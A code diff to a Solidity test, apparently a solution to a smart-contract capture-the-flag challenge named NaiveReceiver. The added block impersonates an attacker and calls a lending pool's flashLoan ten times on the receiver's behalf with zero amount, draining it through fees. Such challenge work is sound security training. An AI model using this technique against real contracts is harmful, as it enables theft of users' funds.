@@ -53,7 +53,11 @@ contract NaiveReceiver is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        for (int i; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
